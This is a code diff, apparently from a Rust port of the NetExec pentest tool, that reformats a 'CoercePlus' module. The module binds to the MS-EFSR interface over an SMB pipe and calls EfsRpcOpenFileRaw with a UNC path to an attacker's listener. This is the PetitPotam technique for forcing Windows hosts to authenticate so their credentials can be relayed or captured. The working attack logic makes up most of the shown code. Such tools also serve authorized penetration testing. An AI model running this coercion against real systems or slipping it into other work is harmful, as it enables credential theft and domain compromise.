@@ -35,7 +35,7 @@ impl NxcModule for CoercePlus {
     }
 
     fn supported_protocols(&self) -> &[&str] {
-        &["smb"].as_slice()
+        ["smb"].as_slice()
     }
 
     fn options(&self) -> Vec<ModuleOption> {
@@ -70,10 +70,7 @@ impl NxcModule for CoercePlus {
             None => return Err(anyhow::anyhow!("LISTENER option is required")),
         };
 
-        let pipe = opts
-            .get("PIPE")
-            .unwrap_or(&"lsarpc".to_string())
-            .to_string();
+        let pipe = opts.get("PIPE").unwrap_or(&"lsarpc".to_string()).to_string();
         info!(
             "Attempting to coerce authentication from {} to listener {}",
             smb_session.target, listener
@@ -86,40 +83,29 @@ impl NxcModule for CoercePlus {
         // Bind to MS-EFSR
         let bind = DcerpcBind::new(UUID_EFSR, 1, 0); // MS-EFSR v1.0
 
-        let _bind_resp = match smb
-            .call_rpc(smb_session, &pipe, PacketType::Bind, 1, bind.to_bytes())
-            .await
-        {
-            Ok(resp) => resp,
-            Err(e) => {
-                error!("Failed to bind to {} over pipe '{}': {}", listener, pipe, e);
-                return Err(anyhow::anyhow!("Bind failed"));
-            }
-        };
+        let _bind_resp =
+            match smb.call_rpc(smb_session, &pipe, PacketType::Bind, 1, bind.to_bytes()).await {
+                Ok(resp) => resp,
+                Err(e) => {
+                    error!("Failed to bind to {} over pipe '{}': {}", listener, pipe, e);
+                    return Err(anyhow::anyhow!("Bind failed"));
+                }
+            };
 
         debug!("Sent EFSR bind to pipe {}", pipe);
 
         // Send EfsRpcOpenFileRaw
-        let target_path = format!("\\\\{}\\share\\file.txt\x00", listener);
+        let target_path = format!("\\\\{listener}\\share\\file.txt\x00");
         let req_payload = efsr::build_efsrpc_open_file_raw(&target_path);
         let dce_req = DcerpcRequest::new(efsr::EFSRPC_OPEN_FILE_RAW, req_payload);
 
         let _trigger_resp = match smb
-            .call_rpc(
-                smb_session,
-                &pipe,
-                PacketType::Request,
-                2,
-                dce_req.to_bytes(),
-            )
+            .call_rpc(smb_session, &pipe, PacketType::Request, 2, dce_req.to_bytes())
             .await
         {
             Ok(resp) => resp,
             Err(e) => {
-                error!(
-                    "Failed to trigger EfsRpcOpenFileRaw check your listener! ({})",
-                    e
-                );
+                error!("Failed to trigger EfsRpcOpenFileRaw check your listener! ({})", e);
                 // We still return true if we triggered because often the pipe closes upon coerce
                 Vec::new()
             }
